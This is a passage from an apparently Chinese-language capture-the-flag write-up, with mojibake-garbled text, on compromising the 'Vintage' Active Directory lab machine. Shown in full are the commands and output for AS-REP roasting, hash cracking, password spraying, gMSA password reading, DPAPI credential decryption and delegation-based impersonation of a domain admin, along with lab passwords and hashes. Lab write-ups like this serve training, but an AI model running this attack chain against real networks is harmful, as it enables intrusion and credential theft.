CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb\rsAMAccountName: svc_ldap\r# svc_ark, Pre-Migration, vintage.htb\rdn: CN=svc_ark,OU=Pre-Migration,DC=vintage,DC=htb\rmemberOf: CN=ServiceAccounts,OU=Pre-Migration,DC=vintage,DC=htb\rsAMAccountName: svc_ark\r# C.Neri_adm, Users, vintage.htb\rdn: CN=C.Neri_adm,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb\rmemberOf: CN=Remote Desktop Users,CN=Builtin,DC=vintage,DC=htb\rsAMAccountName: C.Neri_adm\r# L.Bianchi_adm, Users, vintage.htb\rdn: CN=L.Bianchi_adm,CN=Users,DC=vintage,DC=htb\rmemberOf: CN=DelegatedAdmins,OU=Pre-Migration,DC=vintage,DC=htb\rmemberOf: CN=Domain Admins,CN=Users,DC=vintage,DC=htb\rsAMAccountName: L.Bianchi_adm\r# search reference\rref: ldap://ForestDnsZones.vintage.htb/DC=ForestDnsZones,DC=vintage,DC=htb\r# search reference\rref: ldap://DomainDnsZones.vintage.htb/DC=DomainDnsZones,DC=vintage,DC=htb\r# search reference\rref: ldap://vintage.htb/CN=Configuration,DC=vintage,DC=htb\r# search result\rsearch: 2\rresult: 0 Success\r# numResponses: 21\r# numEntries: 17\r# numReferences: 3 å…¶ä¸­å­˜åœ¨çš„ä¸€ä¸ªComputersï¼Œå…¶åŸŸåä¸ºFS01.vintage.htbä¼¼ä¹å°±æ˜¯è¿™å°æœºå­\nå°†å…¶æ·»åŠ åˆ°/etc/hosts\n# fs01, Computers, vintage.htb\rdn: CN=fs01,CN=Computers,DC=vintage,DC=htb\rmemberOf: CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=vintage,DC=htb\rsAMAccountName: FS01$ Bloodhound #\ré¦–å…ˆè¦åœ¨/etc/resove.confä¸­æ·»åŠ \nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Vintage]\râ””â”€# cat /etc/resolv.conf\r# Generated by NetworkManager\rsearch localdomain\r#nameserver 192.168.237.2 #æ ¹æ®éœ€è¦æ³¨é‡Šæ‰è¿™ä¸€è¡Œ\rnameserver 10.10.11.45 # Your IP æ³¨é‡Šæ‰192.168.xxx.xxxï¼Œæˆ‘å¹¶ä¸çŸ¥é“è¿™æ˜¯å¦æ˜¯å¿…è¦çš„ï¼Œä½†æ˜¯æˆ‘æ³¨é‡Šæ‰åèƒ½æˆåŠŸ\nç„¶åæ³¨æ„åŒæ­¥æ—¶åŒºï¼Œå› ä¸ºKerberosçš„è®¤è¯æœ‰æ—¶åŒºçš„é™åˆ¶\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Vintage]\râ””â”€# ntpdate dc01.vintage.htb\r2024-12-03 16:24:04.142934 (+0800) -833.126733 +/- 0.034009 dc01.vintage.htb 10.10.11.45 s1 no-leap\rCLOCK: time stepped by -833.126733 ç„¶åè¿›è¡Œå†…ç½‘ä¿¡æ¯æ”¶é›†ï¼Œä½¿ç”¨bloodhound\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Vintage]\râ””â”€# bloodhound-python -u P.Rosa -p \u0026#39;Rosaisbest123\u0026#39; -d vintage.htb -c All -dc dc01.vintage.htb INFO: Found AD domain: vintage.htb\rINFO: Getting TGT for user\rINFO: Connecting to LDAP server: dc01.vintage.htb\rINFO: Found 1 domains\rINFO: Found 1 domains in the forest\rINFO: Found 2 computers\rINFO: Connecting to LDAP server: dc01.vintage.htb\rINFO: Found 16 users\rINFO: Found 58 groups\rINFO: Found 2 gpos\rINFO: Found 2 ous\rINFO: Found 19 containers\rINFO: Found 0 trusts\rINFO: Starting computer enumeration with 10 workers\rINFO: Querying computer: FS01.vintage.htb\rINFO: Querying computer: dc01.vintage.htb ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€äº›åˆ†æåçš„æ–‡ä»¶\nå®‰è£…BloodhoundGUIï¼ŒåŒæ—¶è¦å®‰è£…neo4jæ•°æ®åº“\nBloodHoundAD/BloodHound: Six Degrees of Domain Admin (github.com) å¯¼å…¥æ•°æ®è¿›è¡Œåˆ†æ\nå¯ä»¥å‘ç°L.BIANCHI_ADM@VINTAGE.HTBæ˜¯åœ¨åŸŸç®¡ç†å‘˜ç»„ä¸­çš„ï¼Œæœ‰ç®¡ç†å‘˜æƒé™\nå¹¶ä¸”GMSA01$@VINTAGE.HTBå¯ä»¥å°†è‡ªå·±æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„\nåŸŸå†…å…³ç³»\nä»FS01åˆ°GMSA01ï¼Œå¯ä»¥çœ‹åˆ°FS01å¯ä»¥è¯»å–GMSçš„å¯†ç \nç„¶åGMSå¯ä»¥å°†è‡ªå·±æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„\nUser #\rä½¿ç”¨GetTGT.pyï¼šæä¾›å¯†ç ã€hashæˆ–aeskeyç”¨æ¥è¯·æ±‚TGTå¹¶ä¸”ä¿å­˜ä¸ºccacheæ ¼å¼\nâ””â”€# impacket-getTGT -dc-ip 10.10.11.45 vintage.htb/FS01$:fs01\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in FS01$.ccache å°†ç¯å¢ƒå˜é‡ KRB5CCNAME è®¾ç½®ä¸º FS01\\$.ccacheï¼Œä»¥æŒ‡å®š Kerberos å®¢æˆ·ç«¯åº”è¯¥ä½¿ç”¨çš„ç¼“å­˜æ–‡ä»¶\nâ””â”€# export KRB5CCNAME=FS01\\$.ccache ä½¿ç”¨bloodyADä¸ Active Directory äº¤äº’ï¼Œé€šè¿‡ Kerberos èº«ä»½éªŒè¯ï¼Œä»æŒ‡å®šçš„ Active Directory åŸŸæ§åˆ¶å™¨è·å–åä¸º GMSA01$ çš„å—ç®¡æœåŠ¡è´¦æˆ·çš„å¯†ç ï¼ˆå­˜å‚¨åœ¨ msDS-ManagedPassword å±æ€§ä¸­ï¼‰\nâ””â”€# bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k get object \u0026#39;GMSA01$\u0026#39; --attr msDS-ManagedPassword\rdistinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb\rmsDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53\rmsDS-ManagedPassword.B64ENCODED: rbqGzqVFdvxykdQOfIBbURV60BZIq0uuTGQhrt7I1TyP2RA/oEHtUj9GrQGAFahc5XjLHb9RimLD5YXWsF5OiNgZ5SeBM+WrdQIkQPsnm/wZa/GKMx+m6zYXNknGo8teRnCxCinuh22f0Hi6pwpoycKKBWtXin4n8WQXF7gDyGG6l23O9mrmJCFNlGyQ2+75Z1C6DD0jp29nn6WoDq3nhWhv9BdZRkQ7nOkxDU0bFOOKYnSXWMM7SkaXA9S3TQPz86bV9BwYmB/6EfGJd2eHp5wijyIFG4/A+n7iHBfVFcZDN3LhvTKcnnBy5nihhtrMsYh2UMSSN9KEAVQBOAw12g== é€šè¿‡å·²çŸ¥çš„ GMSA è´¦æˆ·å“ˆå¸Œå€¼ï¼Œå°è¯•ä» Active Directory åŸŸæ§åˆ¶å™¨è·å– Kerberos ç¥¨è¯\nâ””â”€# impacket-getTGT vintage.htb/GMSA01$ -hashes aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in GMSA01$.ccache\râ””â”€# export KRB5CCNAME=GMSA01\\$.ccache ç„¶åå°†P.Rosaæ·»åŠ åˆ°SERVICEMANAGERSï¼Œä½¿ç”¨GMSAçš„å‡­è¯ï¼Œç„¶ååœ¨ç”Ÿæˆè‡ªå·±çš„å‡­è¯\nâ””â”€# bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k add groupMember \u0026#34;SERVICEMANAGERS\u0026#34; \u0026#34;P.Rosa\u0026#34;\r[+] P.Rosa added to SERVICEMANAGERS\râ””â”€# impacket-getTGT vintage.htb/P.Rosa:Rosaisbest123 -dc-ip dc01.vintage.htb\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in P.Rosa.ccache\râ””â”€# export KRB5CCNAME=P.Rosa.ccache å°è¯•ä½¿ç”¨è¿™ä¸ªç¥¨æ®æ¥åˆ—å‡ºä¸éœ€è¦KerberosåŸŸè®¤è¯çš„ç”¨æˆ·ï¼Œå…ˆç”ŸæˆåŸŸå†…ç”¨æˆ·çš„ç”¨æˆ·ååˆ—è¡¨\nâ””â”€# ldapsearch -x -H ldap://10.10.11.45 -D \u0026#34;P.Rosa@vintage.htb\u0026#34; -w \u0026#34;Rosaisbest123\u0026#34; -b \u0026#34;DC=vintage,DC=htb\u0026#34; \u0026#34;(objectClass=user)\u0026#34; sAMAccountName | grep \u0026#34;sAMAccountName:\u0026#34; | cut -d \u0026#34; \u0026#34; -f 2 \u0026gt; usernames.txt â””â”€# cat usernames.txt Administrator\rGuest\rDC01$\rkrbtgt\rgMSA01$\rFS01$\rM.Rossi\rR.Verdi\rL.Bianchi\rG.Viola\rC.Neri\rP.Rosa\rsvc_sql\rsvc_ldap\rsvc_ark\rC.Neri_adm\rL.Bianchi_adm ç„¶åç”¨impact-GetNPUsersåˆ—å‡ºä¸éœ€è¦KerberosåŸŸè®¤è¯(UF_DONT_REQUIRE_PREAUTH)çš„ç”¨æˆ·\nâ””â”€# impacket-GetNPUsers -dc-ip 10.10.11.45 -request -usersfile usernames.txt vintage.htb/\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies /usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\rnow = datetime.datetime.utcnow() + datetime.timedelta(days=1)\r[-] User Administrator doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\r[-] User DC01$ doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\r[-] User gMSA01$ doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User FS01$ doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User M.Rossi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User R.Verdi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User L.Bianchi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User G.Viola doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User C.Neri doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User P.Rosa doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\r[-] User svc_ldap doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User svc_ark doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User C.Neri_adm doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User L.Bianchi_adm doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set æ¥ä¸‹æ¥ç¦ç”¨é¢„è®¤è¯\nâ””â”€# bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k add uac SVC_ARK -f DONT_REQ_PREAUTH\r[-] [\u0026#39;DONT_REQ_PREAUTH\u0026#39;] property flags added to SVC_ARK\u0026#39;s userAccountControl\râ””â”€# bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k add uac SVC_LDAP -f DONT_REQ_PREAUTH [-] [\u0026#39;DONT_REQ_PREAUTH\u0026#39;] property flags added to SVC_LDAP\u0026#39;s userAccountControl\râ””â”€# bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k add uac SVC_SQL -f DONT_REQ_PREAUTH [-] [\u0026#39;DONT_REQ_PREAUTH\u0026#39;] property flags added to SVC_SQL\u0026#39;s userAccountControl å¯ç”¨è´¦æˆ·\nâ””â”€# bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k remove uac SVC_ARK -f ACCOUNTDISABLE\r[-] [\u0026#39;ACCOUNTDISABLE\u0026#39;] property flags removed from SVC_ARK\u0026#39;s userAccountControl\râ””â”€# bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k remove uac SVC_LDAP -f ACCOUNTDISABLE\r[-] [\u0026#39;ACCOUNTDISABLE\u0026#39;] property flags removed from SVC_LDAP\u0026#39;s userAccountControl\râ””â”€# bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE\r[-] [\u0026#39;ACCOUNTDISABLE\u0026#39;] property flags removed from SVC_SQL\u0026#39;s userAccountControl å†æ¬¡æ£€æŸ¥åŸŸç”¨æˆ·\nâ””â”€# impacket-GetNPUsers -dc-ip 10.10.11.45 -request -usersfile usernames.txt vintage.htb/\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies /usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).\rnow = datetime.datetime.utcnow() + datetime.timedelta(days=1)\r[-] User Administrator doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\r[-] User DC01$ doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)\r[-] User gMSA01$ doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User FS01$ doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User M.Rossi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User R.Verdi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User L.Bianchi doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User G.Viola doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User C.Neri doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User P.Rosa doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r$krb5asrep$23$svc_sql@VINTAGE.HTB:193416fc53443c06de46d37da3d42166$b35ce4ea605d525055533543a7e9dd10fffc3a65ffc2f33c6961f648c340910cd492095e921ae4acaa30dc45f394e315d8b55ed1a832138d4061fec01cda3a05efe7ff9add64991b10354de2b29e108c905f72a1332a0e3a1d56b3d2023535f6e7bc9ef8435bdbc7152d45ab59e5c69415cc2aea0ffd880746bacda9f29e4d0c394217941623fc8b208aea33d3c3af1c362643c0e502505559d9bd997603673d1e80554ad5483730c8cfd62d4dbcce434cefa88411e7b9902b54c9bc0ec9cf8c9f5da98851eaa44236812e34064a956e45c4a4a911efb16beb6c0bb040a29465468f4a33df5957dd0cb8\r$krb5asrep$23$svc_ldap@VINTAGE.HTB:2e8eb8a54f2e38ceb86cb167ebcfd3a3$4009fa7585adf1b1ce1e62ea59ef0e1db4569403621261a531e062559d9d62eef6bf55b181f10661ddb6de9030ff78d1dcd91a0920ff7c885fb2d85e1e8a2b2bd9894de70f8f6ef413254c150398269766b930f789c8a883b4a45326235480e46fee1db81736e4e1ce86f261a6ea2ddd7c3a6646e59a67b9bf4ff771ccfecc2354df616afedc768a022234517b88b95184b9fbdd90eb43b52ef883720b83be869de267f99ce70da020a4899900c454f3be18a0b85b2c1248a159219c34e85c888edb8f2a09af6d9c4a4d14766d0f248cfbc0a57cdace833cd589aa550de0f9e35ded67ad616ed0adbdbb\r$krb5asrep$23$svc_ark@VINTAGE.HTB:ab991bf5f1ab56057d523c8b04f54993$6d178e1becf696f67f3b6c15f1d67a05570282f82e529a20b932253e72a3a62fd3c6662441c08154a9bd798a3079eb12b4cc104853611229183656c0254292f5b37be0d5a868b0a1b5b4940d40a3be5a1c402e44740b4fa42cd839cde7541268504c924d71b6dd3e6fe72400427d12bd7852cd6e61270b97d006224c5e0732406a6f7598a200e2acbd1d8f4c1ca47c028ab53ddd2d4de9efb98bfb49c2d962fe20bf98fef71d65c48ab252a288f53fac475cce8ddd1e30820a1df9dc058c877ae1e6e1bdcfe3954cbec461dcc085497914c8eb6d910010d4690377bbfedc160b604a1e4132a4e00de923\r[-] User C.Neri_adm doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set\r[-] User L.Bianchi_adm doesn\u0026#39;t have UF_DONT_REQUIRE_PREAUTH set å°è¯•ä½¿ç”¨hashcatè¿›è¡Œçˆ†ç ´\nâ””â”€# hashcat -a 3 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt --show\r$krb5asrep$23$svc_sql@VINTAGE.HTB:21f3bee616690890b5888e3e18d56582$89e966c8c984fdba49c4a5cb373407959a53c78fe823bcb599e4bff22df326780d2a869ed1572467797244c4b2f50a49af143612ee467dba34784a66a5805ad1d556e129838c3107a40259d80edafb2e6f88c80a77a4b3d30d5069a69d3a6b7f001f2fa3251faa17706a7fd255a96c3bfadf10f93e049b0fcc1f41227af5dbefee1ae906f23bfc4d1c6b0f7a8f4328ecce63b45e6944157f88d814830c568fb59763f1d6e785736d5ec368c6d27968c399eaa339067dc32783df85920ae876d3241bace19475691d6373cd0700771659a90d15a4cfeeb1dd89a5a6659b2c6316863e475ce228ac83274f:Zer0the0ne å¾—åˆ°SVC_SQLå¯†ç ï¼šZer0the0ne\nä½¿ç”¨kerbruteå¯¹userè¿›è¡Œçˆ†ç ´\nReleases Â· ropnop/kerbrute (github.com) â””â”€# ./kerbrute --dc vintage.htb -d vintage.htb -v passwordspray usernames.txt Zer0the0ne\r__ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\r/ ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/\r/_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 12/04/24 - Ronnie Flathers @ropnop\r2024/12/04 09:36:16 \u0026gt; Using KDC(s):\r2024/12/04 09:36:16 \u0026gt; vintage.htb:88\r2024/12/04 09:36:16 \u0026gt; [!] krbtgt@vintage.htb:Zer0the0ne - USER LOCKED OUT\r2024/12/04 09:36:17 \u0026gt; [!] Guest@vintage.htb:Zer0the0ne - USER LOCKED OUT\r2024/12/04 09:36:17 \u0026gt; [!] gMSA01$@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] FS01$@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] M.Rossi@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] L.Bianchi@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] R.Verdi@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] DC01$@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] G.Viola@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] Administrator@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] svc_sql@vintage.htb:Zer0the0ne - USER LOCKED OUT\r2024/12/04 09:36:17 \u0026gt; [!] P.Rosa@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] svc_ark@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] L.Bianchi_adm@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] svc_ldap@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [!] C.Neri_adm@vintage.htb:Zer0the0ne - Invalid password\r2024/12/04 09:36:17 \u0026gt; [+] VALID LOGIN: C.Neri@vintage.htb:Zer0the0ne\r2024/12/04 09:36:17 \u0026gt; Done! Tested 17 logins (1 successes) in 0.481 seconds\rè´¦æˆ· C.Neri@vintage.htb ä½¿ç”¨å¯†ç  Zer0the0ne æˆåŠŸç™»å½•\nè·å–è¿™ä¸ªè´¦æˆ·çš„å‡­è¯\nâ””â”€# impacket-getTGT vintage.htb/c.neri:Zer0the0ne -dc-ip vintage.htb Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Saving ticket in c.neri.ccache\râ””â”€# export KRB5CCNAME=c.neri.ccache ç„¶åç”¨5985ç«¯å£è¿œç¨‹ç™»å½•\nâ””â”€# evil-winrm -i dc01.vintage.htb -r vintage.htb è·å–åˆ°User.txt\nRoot #\rä»€ä¹ˆæ˜¯ DPAPIï¼Ÿ #\rDPAPIï¼ˆData Protection APIï¼‰æ˜¯ Windows æ“ä½œç³»ç»Ÿä¸­çš„ä¸€ä¸ªåŠ å¯† APIï¼Œæ—¨åœ¨ä¿æŠ¤æ•æ„Ÿæ•°æ®ï¼Œæ¯”å¦‚å¯†ç ã€ç§é’¥ã€å‡­æ®ç­‰ã€‚å®ƒä¸ºåº”ç”¨ç¨‹åºæä¾›äº†åŠ å¯†å’Œè§£å¯†æ•°æ®çš„èƒ½åŠ›ï¼ŒåŒæ—¶éšè—äº†å¤æ‚çš„åŠ å¯†æ“ä½œï¼Œç®€åŒ–äº†åŠ å¯†è¿‡ç¨‹ã€‚DPAPI çš„è®¾è®¡ç›®çš„æ˜¯ç¡®ä¿åªæœ‰å½“å‰ç”¨æˆ·æˆ–ç³»ç»Ÿèƒ½å¤Ÿè®¿é—®è¿™äº›åŠ å¯†æ•°æ®ã€‚\nDPAPI çš„å·¥ä½œåŸç† #\råŠ å¯†ï¼šå½“ä¸€ä¸ªåº”ç”¨ç¨‹åºæˆ– Windows ç³»ç»Ÿéœ€è¦å­˜å‚¨æ•æ„Ÿä¿¡æ¯æ—¶ï¼Œå®ƒå¯ä»¥é€šè¿‡ DPAPI å°†æ•°æ®åŠ å¯†ã€‚åŠ å¯†ä½¿ç”¨çš„æ˜¯ç”¨æˆ·çš„ç™»å½•å‡­æ®ï¼ˆå¦‚ç”¨æˆ·çš„ç™»å½•å¯†ç æˆ–è®¡ç®—æœºçš„å¯†é’¥ï¼‰æ¥ç”ŸæˆåŠ å¯†å¯†é’¥ã€‚\nè§£å¯†ï¼šåªæœ‰åœ¨ç›¸åŒçš„ç”¨æˆ·ä¸Šä¸‹æ–‡ä¸­ï¼ŒDPAPI æ‰èƒ½ä½¿ç”¨ç›¸åŒçš„å¯†é’¥æ¥è§£å¯†æ•°æ®ã€‚è¿™æ ·ï¼Œå¦‚æœä¸€ä¸ªåº”ç”¨ç¨‹åºæˆ–æœåŠ¡å°è¯•è®¿é—®åŠ å¯†çš„å‡­æ®æˆ–æ•°æ®ï¼Œåªæœ‰å½“å‰ç™»å½•ç”¨æˆ·æˆ–è€…ç®¡ç†å‘˜å¯ä»¥è§£å¯†å¹¶è®¿é—®è¿™äº›ä¿¡æ¯ã€‚\nå®‰å…¨æ€§ï¼šDPAPI æ˜¯åŸºäº Windows æ“ä½œç³»ç»Ÿä¸­çš„è´¦æˆ·è®¤è¯ä¿¡æ¯çš„ï¼Œå› æ­¤å®ƒçš„åŠ å¯†å¯†é’¥ä¸ç”¨æˆ·çš„ç™»å½•å‡­æ®ç´§å¯†å…³è”ï¼Œä¿è¯åªæœ‰ç‰¹å®šç”¨æˆ·æ‰èƒ½è®¿é—®å…¶è‡ªå·±çš„åŠ å¯†æ•°æ®ã€‚\nè¿™é‡Œé€šè¿‡DPAPIæ¥è·å–Windowsçš„èº«ä»½å‡­è¯\n*Evil-WinRM* PS C:\\Users\\C.Neri\\AppData\\Roaming\\Microsoft\\Credentials\u0026gt; dir -h\rDirectory: C:\\Users\\C.Neri\\AppData\\Roaming\\Microsoft\\Credentials\rMode LastWriteTime Length Name\r---- ------------- ------ ----\r-a-hs- 6/7/2024 5:08 PM 430 C4BB96844A5C9DD45D5B6A9859252BA6\r*Evil-WinRM* PS C:\\Users\\C.Neri\\AppData\\Roaming\\Microsoft\\Credentials\u0026gt;download C4BB96844A5C9DD45D5B6A9859252BA6 *Evil-WinRM* PS C:\\Users\\C.Neri\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-4024337825-2033394866-2055507597-1115\u0026gt; dir -h\rDirectory: C:\\Users\\C.Neri\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-4024337825-2033394866-2055507597-1115\rMode LastWriteTime Length Name\r---- ------------- ------ ----\r-a-hs- 12/4/2024 2:46 AM 740 1fe00192-86ec-4689-a4f2-f8c2336edaf4\r-a-hs- 6/7/2024 1:17 PM 740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847\r-a-hs- 6/7/2024 1:17 PM 740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b\r-a-hs- 6/7/2024 1:17 PM 904 BK-VINTAGE\r-a-hs- 12/4/2024 2:46 AM 24 Preferred\r*Evil-WinRM* PS C:\\Users\\C.Neri\\AppData\\Roaming\\Microsoft\\Protect\\S-1-5-21-4024337825-2033394866-2055507597-1115\u0026gt; download 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b ç„¶åè¿›å…¥è§£å¯†\nâ””â”€# impacket-dpapi masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [MASTERKEYFILE]\rVersion : 2 (2)\rGuid : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b\rFlags : 0 (0)\rPolicy : 0 (0)\rMasterKeyLen: 00000088 (136)\rBackupKeyLen: 00000068 (104)\rCredHistLen : 00000000 (0)\rDomainKeyLen: 00000174 (372)\rDecrypted key with User Key (MD4 protected)\rDecrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a\râ””â”€# impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a\rImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [CREDENTIAL]\rLastWritten : 2024-06-07 15:08:23\rFlags : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)\rPersist : 0x00000003 (CRED_PERSIST_ENTERPRISE)\rType : 0x00000001 (CRED_TYPE_GENERIC)\rTarget : LegacyGeneric:target=admin_acc\rDescription : Unknown : Username : vintage\\c.neri_adm\rUnknown : Uncr4ck4bl3P4ssW0rd0312 å¾—åˆ°c.neri_admçš„å¯†ç ä¸ºï¼šUncr4ck4bl3P4ssW0rd0312\næ¥ä¸‹æ¥å°±æ˜¯å°†C.NERL_ADMæ·»åŠ åˆ°DELEGATEDADMINSä¸­\nâ””â”€# bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d \u0026#34;VINTAGE.HTB\u0026#34; -u c.neri_adm -p \u0026#39;Uncr4ck4bl3P4ssW0rd0312\u0026#39; -k add groupMember \u0026#34;DELEGATEDADMINS\u0026#34; \u0026#34;SVC_SQL\u0026#34; [+] SVC_SQL added to DELEGATEDADMINS\râ””â”€# bloodyAD --host dc01.vintage.htb -d \u0026#34;VINTAGE.HTB\u0026#34; --dc-ip 10.10.11.45 -k set object \u0026#34;SVC_SQL\u0026#34; servicePrincipalName -v \u0026#34;cifs/fake\u0026#34; [+] SVC_SQL\u0026#39;s servicePrincipalName has been updated è·å–è¿™ä¸ªSVCçš„ç¥¨æ®\nâ””â”€# impacket-getTGT vintage.htb/svc_sql:Zer0the0ne -dc-ip dc01.vintage.htb\râ””â”€# export KRB5CCNAME=svc_sql.ccache å‡å†’L.BIANCHI_ADMç”¨æˆ·è¯·æ±‚cifs/dc01.vintage.htb æœåŠ¡çš„æœåŠ¡ç¥¨æ®ã€‚æˆåŠŸè·å–è¯¥ç¥¨æ®åï¼Œå¯ä»¥ä½¿ç”¨å®ƒæ¥è®¿é—®è¯¥æœåŠ¡ã€‚\nâ””â”€# impacket-getST -spn \u0026#39;cifs/dc01.vintage.htb\u0026#39; -impersonate L.BIANCHI_ADM -dc-ip 10.10.11.45 -k \u0026#39;vintage.htb/svc_sql:Zer0the0ne\u0026#39; â””â”€# export KRB5CCNAME=L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache ç°åœ¨æœ‰äº†L.BIANCHIçš„ç¥¨æ®äº†ï¼Œå¯ä»¥ç›´æ¥é€šè¿‡wmiexecæ‰§è¡Œå‘½ä»¤\nâ””â”€# 